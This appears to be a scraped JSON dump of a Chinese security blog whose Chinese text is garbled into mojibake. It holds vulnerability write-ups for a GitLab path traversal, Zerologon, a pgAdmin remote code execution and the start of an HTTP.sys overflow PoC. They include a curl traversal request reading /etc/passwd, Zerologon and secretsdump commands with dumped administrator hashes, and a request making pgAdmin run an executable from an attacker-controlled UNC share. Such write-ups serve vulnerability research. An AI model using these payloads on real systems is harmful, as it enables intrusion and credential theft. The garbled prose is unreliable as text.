è¿™ä¸ªå‡½æ•°æ¥æ”¶ä¸€ä¸ªè·¯å¾„ï¼Œè€Œåç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ°äº†åˆ™æŠ›å‡ºPathTraversalAttackError é”™è¯¯ï¼ŒæŠŠè¿™æ®µæ­£åˆ™è¡¨è¾¾å¼ç»™ChatGPTï¼Œç»™å‡ºäº†å¦‚ä¸‹è§£é‡Šï¼Œæ‰€ä»¥ä»£ç è°ƒç”¨è¿™ä¸ªå‡½æ•°å¯ä»¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¶æ„çš„ç›®å½•ç©¿è¶Šã€‚\nè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯ç”¨æ¥åŒ¹é…æ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²ä¸­çš„ç›¸å¯¹è·¯å¾„ï¼ˆå¦‚\u0026#34;./\u0026#34;ã€\u0026#34;../\u0026#34;ç­‰ï¼‰çš„ï¼Œå®ƒçš„å«ä¹‰ä¸å‰ä¸€ä¸ªé—®é¢˜ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯ä½¿ç”¨äº†ä¸åŒçš„è¯­æ³•æ¥è¡¨ç¤ºç›¸åŒçš„å«ä¹‰ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰å¦‚ä¸‹ï¼š json \\A åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ (.{1,2}) åŒ¹é…ä¸€ä¸ªæˆ–ä¸¤ä¸ªä»»æ„å­—ç¬¦ï¼Œå¹¶å°†å…¶ä½œä¸ºä¸€ä¸ªåˆ†ç»„ \\z åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ | æˆ– \\A..\\[/\\\\] åŒ¹é…ä»¥\u0026#34;../\u0026#34;å¼€å¤´çš„å­—ç¬¦ä¸² | æˆ– [/\\\\]..\\z åŒ¹é…ä»¥\u0026#34;/..\u0026#34;ç»“å°¾çš„å­—ç¬¦ä¸² | æˆ– [/\\\\]..\\[/\\\\] åŒ¹é…\u0026#34;/../\u0026#34;æˆ–\u0026#34;\\..\\\u0026#34;è¿™æ ·ä»¥\u0026#34;/\u0026#34;æˆ–\u0026#34;\\\u0026#34;å¼€å¤´ä¸”ä»¥\u0026#34;/\u0026#34;æˆ–\u0026#34;\\\u0026#34;ç»“å°¾çš„å­—ç¬¦ä¸² | æˆ– \\n åŒ¹é…æ¢è¡Œç¬¦ ) åˆ†ç»„ç»“æŸ å…¶ä¸­ï¼Œ\\Aã€\\zå’Œ\\nåˆ†åˆ«ä»£è¡¨å­—ç¬¦ä¸²çš„å¼€å¤´ã€ç»“å°¾å’Œæ¢è¡Œç¬¦ï¼Œ|è¡¨ç¤ºæˆ–çš„å…³ç³»ï¼Œ[/\\\\]ç”¨æ¥åŒ¹é…\u0026#34;\u0026#34;æˆ–\u0026#34;/\u0026#34;è¿™ä¸¤ç§ç›®å½•åˆ†éš”ç¬¦ï¼Œå› ä¸ºåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œç›®å½•åˆ†éš”ç¬¦æ˜¯ä¸åŒçš„ã€‚ è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ä½œç”¨æ˜¯åŒ¹é…ä¸€ä¸ªç›¸å¯¹è·¯å¾„å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ä¸åˆæ³•çš„ç›¸å¯¹è·¯å¾„ï¼Œä¾‹å¦‚è·¯å¾„ä¸­åŒ…å«è¶…å‡ºæ ¹ç›®å½•çš„\u0026#34;../\u0026#34;æˆ–è€…\u0026#34;..\u0026#34;è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…ä»¥\u0026#34;../\u0026#34;å¼€å¤´æˆ–ä»¥\u0026#34;/..\u0026#34;ç»“å°¾ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œè¯´æ˜è¯¥è·¯å¾„å­˜åœ¨ä¸åˆæ³•çš„ç›¸å¯¹è·¯å¾„ï¼Œéœ€è¦è¿›è¡Œå¤„ç†æˆ–æŠ¥é”™ã€‚ è¡¥ä¸è¿˜ä»¥ä¸‹è·¯å¾„æ–°å¢äº†æ–‡ä»¶ï¼Œä¸éš¾çœ‹å‡ºæ˜¯åœ¨å®šä¹‰äº†moduleå’Œuploadå¯¹è±¡ï¼Œè€Œåå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²show_pathå¹¶æŠŠå®ƒä¼ ç»™äº†config/routes/uploads.rbæ‰§è¡Œã€‚\nspec\\requests\\uploads_controller_spec.rb # frozen_string_literal: true require \u0026#39;spec_helper\u0026#39; RSpec.describe UploadsController, feature_category: :shared do include WorkhorseHelpers it_behaves_like \u0026#39;uploads actions\u0026#39; do let_it_be(:model) { create(:personal_snippet, :public) } let_it_be(:upload) { create(:upload, :personal_snippet_upload, :with_file, model: model) } # See config/routes/uploads.rb let(:show_path) do \u0026#34;/uploads/-/system/#{model.model_name.singular}/#{model.to_param}/#{upload.secret}/#{File.basename(upload.path)}\u0026#34; end end end åœ¨config/routes/uploads.rbä¸­ï¼Œå®šä¹‰äº†è·¯ç”±åŒ¹é…è§„åˆ™ç”¨æ¥å¤„ç†ä¸Šä¼ æ–‡ä»¶å’Œæ˜¾ç¤ºæ–‡ä»¶çš„è¯·æ±‚ï¼Œç»“åˆspec\\requests\\uploads_controller_spec.rbçš„å†…å®¹å¯ä»¥çŸ¥é“åº”è¯¥æ˜¯åœ¨å¤„ç†è·¯ç”±get '-/system/:model/:id/:secret/:filename'æ—¶ï¼Œå°†æ–‡ä»¶åä¼ ç»™uploadsæ¨¡å—çš„showæ–¹æ³•è§¦å‘æ¼æ´ã€‚\nconfig/routes/uploads.rb # frozen_string_literal: true scope path: :uploads do # Note attachments and User/Group/Project/Topic avatars get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: %r{note|user|group|project|projects\\/topic|achievements\\/achievement}, mounted_as: /avatar|attachment/, filename: %r{[^/]+} } # show uploads for models, snippets (notes) available for now get \u0026#39;-/system/:model/:id/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/, filename: %r{[^/]+} } # show temporary uploads get \u0026#39;-/system/temp/:secret/:filename\u0026#39;, to: \u0026#39;uploads#show\u0026#39;, constraints: { filename: %r{[^/]+} } # Appearance get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /appearance/, mounted_as: /logo|header_logo|pwa_icon|favicon/, filename: /.+/ }, as: \u0026#39;appearance_upload\u0026#39; # create uploads for models, snippets (notes) available for now post \u0026#39;:model\u0026#39;, to: \u0026#39;uploads#create\u0026#39;, constraints: { model: /personal_snippet|user/, id: /\\d+/ }, as: \u0026#39;upload\u0026#39; post \u0026#39;:model/authorize\u0026#39;, to: \u0026#39;uploads#authorize\u0026#39;, constraints: { model: /personal_snippet|user/ } # Alert Metric Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /alert_management_metric_image/, mounted_as: /file/, filename: %r{[^/]+} }, as: \u0026#39;alert_metric_image_upload\u0026#39; # Abuse Reports Images get \u0026#34;-/system/:model/:mounted_as/:id/:filename\u0026#34;, to: \u0026#34;uploads#show\u0026#34;, constraints: { model: /abuse_report/, mounted_as: /screenshot/, filename: %r{[^/]+} }, as: \u0026#39;abuse_report_upload\u0026#39; end # Redirect old note attachments path to new uploads path. get \u0026#34;files/note/:id/:filename\u0026#34;, to: redirect(\u0026#34;uploads/note/attachment/%{id}/%{filename}\u0026#34;), constraints: { filename: %r{[^/]+} } å‘ç‚¹ ç»„å±‚æ•°ä¸å¤Ÿ\nåŸå…ˆæŒ‰ç…§å®˜æ–¹é€šå‘Šè¯´çš„è‡³å°‘5å±‚ç»„åµŒå¥—ï¼Œå°±åªæ–°å»ºäº†5å±‚ï¼Œè€Œåå‘é€payloadï¼Œä¸€ç›´æŠ¥400ï¼Œä¸€åº¦ä»¥ä¸ºç¯å¢ƒæ˜¯16.0.1ä¿®å¤ç‰ˆæœ¬ï¼Œè€Œåå‘ç°æ˜¯åµŒå¥—ä¸å¤Ÿã€‚\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;400 Bad Request\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; åæ¥å¾—åˆ°åŒäº‹æç¤ºï¼Œéœ€è¦è‡³å°‘9å±‚æ‰å¯ä»¥è®¿é—®åˆ°æ ¹ç›®å½•ã€‚\nç©¿è¶Šç¬¦ä¸å¤Ÿ\nç»æµ‹è¯•ï¼Œè‡³å°‘éœ€è¦12ä¸ªç©¿è¶Šç¬¦../ æ‰èƒ½æˆåŠŸç©¿è¶Šåˆ°æ ¹ç›®å½•\nå°ç»“\næœ¬æ¬¡æ¼æ´åˆ†ææœ‰ç‚¹äº‹åè¯¸è‘›äº®ï¼Œä»å·²çŸ¥çš„PoCæ¨æµ‹è§¦å‘çš„æ–‡ä»¶è·¯å¾„ï¼Œä½†æ€»ç®—æˆåŠŸç†è§£äº†æ•´ä¸ªè§¦å‘æ–‡ä»¶æµï¼Œå‘ç‚¹å°±æ˜¯nginxè§£æå¯¼è‡´éœ€è¦è¶³å¤Ÿçš„groupæ‰èƒ½ç©¿è¶Šåˆ°æ ¹ç›®å½•ï¼Œåˆ†æè¿™ä¸ªæ¼æ´çš„æ—¶å€™æ²¡å­¦è¿‡rubyï¼Œä¾é ChatGPTæ‰èƒ½å¤Ÿç†è§£æŸäº›ä»£ç ã€‚\nCreated at 2023-05-26T10:36:20+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/","title":"Zero Logon åˆ†æ","tags":[],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Netlogonåè®®è®¤è¯è¿‡ç¨‹ï¼š å½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º win server 2012 æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åˆ©ç”¨ åŸŸç¯å¢ƒä½¿ç”¨Windows server 2012R2æ­å»ºï¼Œå…ˆç”¨\rè„šæœ¬é‡ç½®åŸŸè´¦æˆ·å¯†ç  python cve-2020-1472-exploit.py WIN2016 192.168.52.130 å¹¶æŠ“å–æ•°æ®åŒ… é‡ç½®ä¹‹ååŸŸè´¦æˆ·çš„å¯†ç ä¸ºç©ºï¼Œå¯¹åº”hashä¸º31d6cfe0d16ae931b73c59d7e0c089c0\nå®‰è£…impacketï¼š\npython3 -m pipx install impacket pipx ensurepath ä½¿ç”¨impacketçš„secretsdumpè¿›è¡ŒDcsyncï¼Œå¾—åˆ°Administratrè´¦æˆ·çš„NTLM hash secretsdump.py cqy.io/WIN2016\\$@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy\\\\administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6 Administrator:des-cbc-md5:f732d313b5e92585 [*] Cleaning up... PoCåˆ†æ å…³é”®ä»£ç æ˜¯ä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼Œå‚æ•°rpc_conæ˜¯DCERPC_v5å¯¹è±¡ï¼Œæè¿°äº†rcpé“¾æ¥ï¼Œ\nfor attempt in range(0, MAX_ATTEMPTS): result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer) if result is None: print(\u0026#39;=\u0026#39;, end=\u0026#39;\u0026#39;, flush=True) else: break def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer): # Connect to the DC\u0026#39;s Netlogon service. # Use an all-zero challenge and credential. plaintext = b\u0026#39;\\x00\u0026#39; * 8 ciphertext = b\u0026#39;\\x00\u0026#39; * 8 # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. flags = 0x212fffff # Send challenge and authentication request. nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;\\x00\u0026#39;, plaintext) try: server_auth = nrpc.hNetrServerAuthenticate3( rpc_con, dc_handle + \u0026#39;\\x00\u0026#39;, target_computer + \u0026#39;$\\x00\u0026#39;, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, target_computer + \u0026#39;\\x00\u0026#39;, ciphertext, flags ) # It worked! assert server_auth[\u0026#39;ErrorCode\u0026#39;] == 0 return True except nrpc.DCERPCSessionError as ex: # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working. if ex.get_error_code() == 0xc0000022: return None else: fail(f\u0026#39;Unexpected error code from DC: {ex.get_error_code()}.\u0026#39;) except BaseException as ex: fail(f\u0026#39;Unexpected error: {ex}.\u0026#39;) åœ¨PoCä¸­å¾ªç¯å‘èµ·è®¤è¯ï¼Œæ¯æ¬¡è®¤è¯æ—¶ï¼Œclient challengeç½®ä¸º0x00 * 8ï¼Œclient credentialç½®ä¸º0x00 * 8 åœ¨\rnetlogonåè®®ä¸­çŸ¥é“ï¼ŒæœåŠ¡å™¨ä¼šæ¯”è¾ƒè‡ªå·±è®¡ç®—çš„ClientCredentialå’Œå®¢æˆ·ç«¯å‘è¿‡æ¥çš„ClientCredentialæ˜¯å¦ç›¸ç­‰ï¼Œè€ŒClientCredentialæ¥æºäºä¼šè¯å¯†é’¥åŠ å¯†ClientChallengeã€‚å…¶ä¸­åŠ å¯†ç®—æ³•ä¸ºAESï¼Œä½¿ç”¨CFB8æ¨¡å¼ã€‚è¯¥ç®—æ³•è¿‡ç¨‹å¦‚ä¸‹ï¼š ç®—æ³•æ­¥éª¤ï¼š\nç¡®å®šä¸€ä¸ª16å­—èŠ‚çš„åˆå§‹å‘é‡IVã€‚ å°†IVå’Œæ˜æ–‡ç»„åˆ,ä¾‹å¦‚IV + æ˜æ–‡çš„å‰16ä¸ªå­—èŠ‚ã€‚ å¯¹ç»„åˆçš„æ•°æ®å—è¿›è¡ŒAESåŠ å¯†,è¾“å‡ºä¸€ä¸ª16å­—èŠ‚çš„å¯†æ–‡å—ã€‚ ä»å¯†æ–‡å—çš„ç¬¬ä¸€ä¸ªå­—èŠ‚,ä¸æ˜æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚è¿›è¡Œå¼‚æˆ–,å¾—åˆ°å¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚ å¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸IVçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ç»„åˆ,å½¢æˆä¸€ä¸ªæ–°çš„16å­—èŠ‚å€¼ã€‚ å¯¹è¿™ä¸ªæ–°çš„å€¼å†æ¬¡è¿›è¡ŒAESåŠ å¯†,å¾—åˆ°ä¸‹ä¸€ä¸ª16å­—èŠ‚å¯†æ–‡å—ã€‚ ä»æ–°å¯†æ–‡å—å–ç¬¬ä¸€ä¸ªå­—èŠ‚,ä¸æ˜æ–‡çš„ä¸‹ä¸€ä¸ªå­—èŠ‚å¼‚æˆ–,ç”Ÿæˆå¯†æ–‡çš„ä¸‹ä¸€ä¸ªå­—èŠ‚ã€‚ é‡å¤æ­¥éª¤5-7,ç›´åˆ°æ‰€æœ‰æ˜æ–‡éƒ½è¢«åŠ å¯†ã€‚ è‹¥æ˜æ–‡ä¸è¶³16çš„å€æ•°å­—èŠ‚,å‰©ä½™æ˜æ–‡ä½¿ç”¨PKCS7Paddingè¿›è¡Œå¡«å……ã€‚ AES-CFB8é€šè¿‡å‰ä¸€ä¸ªå¯†æ–‡å—çš„åé¦ˆæ¥å½±å“ä¸‹ä¸€ä¸ªæ˜æ–‡å—çš„åŠ å¯†,ä»è€Œé¿å…äº†ECBæ¨¡å¼çš„ç¡®å®šæ€§é—®é¢˜ã€‚ä½†å¿…é¡»ä½¿ç”¨éšæœºçš„IVæ¥ä¿è¯å®‰å…¨æ€§ã€‚\nä¼šè¯å¯†é’¥è®¡ç®—å…¬å¼ï¼šKDF(ClientChallenge+ServerChallenge+secret)ï¼Œåœ¨æ¯ä¸€è½®è®¤è¯è¿‡ç¨‹ä¸­ï¼ŒServerChallengeéƒ½ä¼šå˜åŒ–ï¼Œä½†Windowsä¸­å®ç°çš„AES-CFB8ä½¿ç”¨çš„ivè¢«è®¾ä¸º16å­—èŠ‚çš„0x00 æ”»å‡»è€…å¯æ§ClientChallengeå’ŒClientCredentialï¼ŒCLientChallengeå¯¹åº”äºè“è‰²éƒ¨åˆ†ã€‚ç”±äºè½®è®¤è¯æ—¶ServerChallengeéƒ½ä¼šæ”¹å˜ä¸”ä¸ä¼šé‡å¤ï¼Œæ‰€ä»¥æ¯æ¬¡è®¡ç®—å‡ºçš„ä¼šè¯å¯†é’¥éƒ½ä¸ä¸€æ ·ã€‚å½“ClientChallengeç½®ä¸º0x00 * 8ï¼Œå½“ç¬¬ä¸€è½®è®¡ç®—æ—¶ï¼Œè®¡ç®—å‡ºçš„ç»“æœæœ‰1/256æ¦‚ç‡ä¸º0x00ï¼Œè€Œè¿™ä¸ª0x00åˆä¼šä½œä¸ºä¸‹ä¸€è½®è¾“å…¥æ·»åŠ åˆ°ivçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå³æœ‰1/256æ¦‚ç‡è®¡ç®—åçš„ç»“æœå’Œè®¡ç®—å‰çš„å€¼ä¸€æ ·å…¨ä¸º0x00ï¼Œè¿™æ ·æ¯ä¸€è½®è®¡ç®—ç»“æœéƒ½æ˜¯å…¨ä¸º0x00ã€‚ è¿™æ ·ç¬¬ä¸€è½®è®¡ç®—ååœ¨ç®—æ³•ä¸­çš„è¾“å…¥ä¸ºå…¨0ï¼ŒåŠ å¯†å¯†é’¥ä¸å˜ï¼Œç¬¬äºŒè½®è®¡ç®—æ—¶ï¼Œç»“æœä¾ç„¶ä¼šæ˜¯0ï¼Œè¿™æ ·æœ€ç»ˆç®—æ³•ç»“æœè¾“å‡ºä¼šæ˜¯å…¨0ã€‚ ç”±äºæ¯è½®è®¤è¯è¿‡ç¨‹ä¸­ä¼šè¯å¯†é’¥éƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ¯ä¸€è½®è®¤è¯è¿‡ç¨‹æ—¶ï¼ŒAES-CFB8ç¬¬ä¸€è½®è®¡ç®—çš„ç»“æœéƒ½ä¼šä¸ä¸€æ ·ï¼Œç»“æœæœ€å¤šæœ‰256ç§æƒ…å†µï¼Œæœ€å·®çš„æƒ…å†µåœ¨ç¬¬256è½®æ—¶è®¡ç®—ç»“æœä¸º0x00ã€‚\nå½“AES-CFB8åŠ å¯†ç»“æœåˆšåˆšå¥½ä¸ºå…¨0æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€çš„ClientCredentialä¹Ÿä¸ºå…¨0ï¼Œæ­¤æ—¶å°±å¯ä»¥é€šè¿‡æœåŠ¡ç«¯çš„æ ¡éªŒï¼Œå®Œæˆèº«ä»½éªŒè¯ã€‚\nå¯ä»¥ç¼–å†™ä¸€æ®µç®€å•çš„pythonä»£ç æ¨¡æ‹ŸæœåŠ¡ç«¯åŠ å¯†è¿‡ç¨‹\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend import secrets iv = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 16 byte IV plaintext = bytes([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, ]) # 8 byte plaintext for i in range(256): key = secrets.token_bytes(16) # 8 byte key cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=default_backend()) encryptor = cipher.encryptor() ciphertext = encryptor.update(plaintext) + encryptor.finalize() print(ciphertext.hex()) åœ¨ç¬¬115æ¬¡æ—¶ï¼ŒåŠ å¯†åçš„å¯†æ–‡ä¸º0x0000000000000000 å‚è€ƒé“¾æ¥\nhttps://xz.aliyun.com/t/8367 https://www.anquanke.com/post/id/219374#h3-6 https://www.secrss.com/articles/25580\nCreated at 2023-05-08T14:39:28+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/","title":"CVE-2022-4223 PgAdmin RCE åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ pgAdmin æœåŠ¡å™¨åŒ…å«ä¸€ä¸ª HTTP APIï¼Œç”¨äºéªŒè¯ç”¨æˆ·é€‰æ‹©çš„å¤–éƒ¨ PostgreSQL å®ç”¨ç¨‹åºï¼ˆå¦‚ pg_dump å’Œ pg_restoreï¼‰çš„è·¯å¾„ã€‚è¯¥å®ç”¨ç¨‹åºç”±æœåŠ¡å™¨æ‰§è¡Œï¼Œä»¥ç¡®å®šå®ƒæ¥è‡ªå“ªä¸ªPostgreSQLç‰ˆæœ¬ã€‚6.17 ä¹‹å‰çš„ pgAdmin ç‰ˆæœ¬æ— æ³•æ­£ç¡®ä¿æŠ¤æ­¤ APIï¼Œè¿™å¯èƒ½å…è®¸æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·ä½¿ç”¨ä»–ä»¬é€‰æ‹©çš„è·¯å¾„è°ƒç”¨å®ƒï¼Œä¾‹å¦‚ä»–ä»¬åœ¨ Windows è®¡ç®—æœºä¸Šæ§åˆ¶çš„æœåŠ¡å™¨çš„ UNC è·¯å¾„ã€‚è¿™å°†å¯¼è‡´ç›®æ ‡è·¯å¾„ä¸­æ­£ç¡®å‘½åçš„å¯æ‰§è¡Œæ–‡ä»¶ç”± pgAdmin æœåŠ¡å™¨æ‰§è¡Œã€‚\næŒ‡çº¹ ç•¥\nå½±å“ç‰ˆæœ¬ pgadmin \u0026lt; 6.17\nç¯å¢ƒæ­å»º windows 10 postgresql13 æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• å¤ç° ç›´æ¥å®‰è£…postgresql13ï¼Œè‡ªå¸¦äº†pgadmin4ï¼Œåˆå§‹åŒ–ç¯å¢ƒåï¼Œä½¿ç”¨python å¯åŠ¨pgadmin4ï¼Œç¼–è¯‘å¦‚ä¸‹ä»£ç \n#include\u0026lt;stdlib\u0026gt; int main(){ system(\u0026#34;whoami \u0026gt; c:\\\\users\\\\public\\\\1.txt\u0026#34;); return 0; } ç¼–è¯‘åå‘½åä¸ºpg_dump.exeï¼Œå°†å…¶æ”¾åˆ°æŸä¸ªç›®å½•å†…ï¼Œå¹¶å¼€å¯æ–‡ä»¶å…±äº«ã€‚ å‘é€å¦‚ä¸‹payloadï¼Œåœ¨utility_pathæŒ‡å‘å…±äº«çš„æ–‡ä»¶å¤¹è·¯å¾„ï¼Œ\nPOST /misc/validate_binary_path HTTP/1.1 Host: [TARGETHOST] Cookie: [COOKIES_YOU_FETCHED_IN_ADVANCE] X-pgA-CSRFToken: [CSRF_TOKEN_YOU_FETCHED_IN_ADVANCE] Connection: close Referer: https://[TARGETHOST]/browser/ Content-Length: [n] Content-Type: application/json {\u0026#34;utility_path\u0026#34;:\u0026#34;\\\\\\\\[ATTACKER_IP]\\\\[PREFERED_SHARE_NAME]\u0026#34;} åˆ†æ åœ¨ validate_binary_pathè·¯ç”±å¯¹åº”çš„å¤„ç†å‡½æ•°å¦‚ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶POSTè¯·æ±‚ï¼Œè€Œåè·å–åˆ°bodyé‡Œé¢çš„ utility_pathï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶ utility_pathå¹¶ä½¿ç”¨ os.path.abspath(os.path.joinæ‹¼æ¥è·¯å¾„ï¼Œè€Œ os.path.joinå¯ä»¥æ¥å—[[UNCè·¯å¾„]]ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ­å»ºä¸€ä¸ªSMBæœåŠ¡å™¨å¹¶åœ¨ä¸Šé¢æœ‰ pg_dump.exeï¼Œä¼ å…¥UNCè·¯å¾„ï¼Œpgadminå°±ä¼šè·å–åˆ°è¿™ä¸ªæ–‡ä»¶å¹¶æ‰§è¡Œï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚\n@blueprint.route(\u0026#34;/validate_binary_path\u0026#34;, endpoint=\u0026#34;validate_binary_path\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) # [1] def validate_binary_path(): \u0026#34;\u0026#34;\u0026#34; This function is used to validate the specified utilities path by running the utilities with there versions. \u0026#34;\u0026#34;\u0026#34; data = None if hasattr(request.data, \u0026#39;decode\u0026#39;): data = request.data.decode(\u0026#39;utf-8\u0026#39;) if data != \u0026#39;\u0026#39;: data = json.loads(data) version_str = \u0026#39;\u0026#39; if \u0026#39;utility_path\u0026#39; in data and data[\u0026#39;utility_path\u0026#39;] is not None: # [2] # Check if \u0026#34;$DIR\u0026#34; present in binary path binary_path = replace_binary_path(data[\u0026#39;utility_path\u0026#39;]) # [3] for utility in UTILITIES_ARRAY: # [4] full_path = os.path.abspath( os.path.join(binary_path, (utility if os.name != \u0026#39;nt\u0026#39; else (utility + \u0026#39;.exe\u0026#39;)))) # [5] try: # Get the output of the \u0026#39;--version\u0026#39; command version_string = \\ subprocess.getoutput(\u0026#39;\u0026#34;{0}\u0026#34; --version\u0026#39;.format(full_path)) # [6] # Get the version number by splitting the result string version_string.split(\u0026#34;) \u0026#34;, 1)[1].split(\u0026#39;.\u0026#39;, 1)[0] ... è¡¥ä¸ è¡¥ä¸ä¸­å¢åŠ äº†èº«ä»½éªŒè¯ï¼Œå¹¶ä¸”åœ¨æ‹¼æ¥è·¯å¾„æ—¶ä½¿ç”¨os.path.existsæ£€æŸ¥æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æŠ¥é”™ã€‚\nå°ç»“ è¿™ä¸ªæ¼æ´åŸç†è¾ƒä¸ºç®€å•ï¼Œpythonçš„å‡½æ•°å¯ä»¥æ¥æ”¶UNCè·¯å¾„ï¼Œè€Œå¼€å‘è€…å¹¶æœªè€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´å¯ä»¥ä¼ å…¥UNCè·¯å¾„è¾¾æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ä¸ªæ¼æ´æ˜¯é codeqlå®¡è®¡å‡ºæ¥çš„ã€‚\nå‚è€ƒé“¾æ¥\nhttps://frycos.github.io/vulns4free/2022/12/02/rce-in-20-minutes.html\nCreated at 2023-05-08T14:18:21+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/","title":"CVE-2023-23410 Windows HTTP.sys æƒé™æå‡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨http.sysä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡ºæ¼æ´ç»•è¿‡å­—æ®µå¤§å°æ£€æŸ¥ï¼Œå¯¼è‡´åœ¨è°ƒç”¨memcpyæ—¶ä¼ å…¥è¶…å‡ºç¼“å†²åŒºå¤§å°çš„é•¿åº¦å‚æ•°ï¼Œé€ æˆå†…å­˜æº¢å‡ºã€‚\nç¯å¢ƒæ­å»º æ“ä½œç³»ç»Ÿ windows 10 è°ƒè¯•å™¨ windbg æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• PoC\n#define _WIN32_WINNT 0x0A00 #define SECURITY_WIN32 #include \u0026lt;http.h\u0026gt; #include \u0026lt;sspi.h\u0026gt; #include \u0026lt;strsafe.h\u0026gt; #pragma warning(disable : 4127) // condition expression is constant int __cdecl wmain(int argc, __in_ecount(argc) wchar_t *argv[]) { HANDLE hReqQueue = NULL; HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2; HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID; ULONG retCode; HTTP_URL_GROUP_ID 